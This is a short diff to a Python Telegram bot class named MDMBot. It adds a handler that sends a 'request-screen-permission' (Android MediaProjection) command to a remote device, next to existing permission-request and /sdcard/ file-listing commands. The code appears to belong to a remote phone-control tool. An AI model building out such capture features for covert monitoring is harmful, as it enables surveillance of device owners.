@@ -1190,6 +1190,9 @@ class MDMBot:
                 if tgt.startswith("request-permission:"):
                     perm_type = tgt.split(":", 1)[1] if ":" in tgt else ""
                     self._send_cmd(c.message.chat.id, did, "request-permission", {"value": perm_type})
+                # ⚡ Handle request-screen-permission (MediaProjection)
+                elif tgt == "request-screen-permission":
+                    self._send_cmd(c.message.chat.id, did, "request-screen-permission")
                 # For ls command, default to /sdcard/ if no path specified
                 elif tgt == "ls":
                     self._send_cmd(c.message.chat.id, did, "ls", {"value": "/sdcard/"})
